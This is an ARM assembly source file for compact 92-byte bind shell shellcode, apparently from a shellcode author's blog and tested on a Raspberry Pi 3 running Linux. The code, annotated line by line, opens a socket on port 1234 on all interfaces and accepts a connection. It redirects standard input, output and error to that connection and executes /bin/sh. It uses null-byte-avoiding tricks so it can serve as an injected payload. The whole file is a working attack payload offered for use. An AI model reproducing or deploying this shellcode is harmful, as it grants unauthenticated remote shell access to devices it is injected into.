/**
  bind shell to port 1234
  tested with linux running on raspberry pi 3  
 
  http://modexp.wordpress.com/   
*/

// 92 bytes
    .arch armv6
    .global _start
    .text

_start:
    // switch to thumb mode
    .code 32
    add    r3, pc, #1
    bx     r3 
  
    .code 16
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    r2, r2, r2   // r2 = IPPROTO_IP
    mov    r1, #1       // r1 = SOCK_STREAM
    mov    r0, #2       // r0 = AF_INET
    lsl    r7, r1, #8   // multiply by 256
    add    r7, #25      // r7 = 256+25 = 281 = socket
    svc    1
    
    mov    r6, r0       // r6 = s
    
    // bind(s, &sa, sizeof(sa));  
    adr    r1, sa       // r1 = &sa
    strb   r2, [r1, #1] // zero 0xFF in sa.sin_family
    str    r2, [r1, #4] // zero sa.sin_addr   
    mov    r2, #16      // r2 = sizeof(sa)  
    add    r7, #1       // r7 = 281+1 = 282 = bind
    svc    1
  
    // listen(s, 1);
    mov    r1, #1       // r1 = 1    
    mov    r0, r6
    add    r7, #2       // r7 = 282+2 = 284 = listen 
    svc    1    
    
    // r = accept(s, 0, 0);
    eor    r2, r2, r2   // r2 = 0
    eor    r1, r1, r1   // r1 = 0
    mov    r0, r6       // r0 = s
    add    r7, #1       // r7 = 284+1 = 285 = accept    
    svc    1    
    
    mov    r6, r0       // r6 = r
    
    // dup2(r, FILENO_STDIN);
    // dup2(r, FILENO_STDOUT);
    // dup2(r, FILENO_STDERR);
    mov    r1, #3       // for 3 descriptors
c_dup:
    mov    r7, #63      // r7 = dup2 
    mov    r0, r6       // r0 = r
    sub    r1, #1       // decrease r1
    svc    1
    bne    c_dup        // while (r1 != 0)

    // execve("/bin/sh", NULL, NULL);
    adr    r0, sh       // r0 = "/bin/sh" 
    strb   r2, [r0, #7] // add null terminator    
    mov    r7, #11      // r7 = execve
    svc    1
sa:    
    // sa.sin_port   = htons(1234);
    // sa.sin_family = AF_INET;
    // sa.sin_addr   = INADDR_ANY;
    .word  0xD204FF02 
    .word  0xFFFFFFFF  
sh:    
    .ascii "/bin/shX"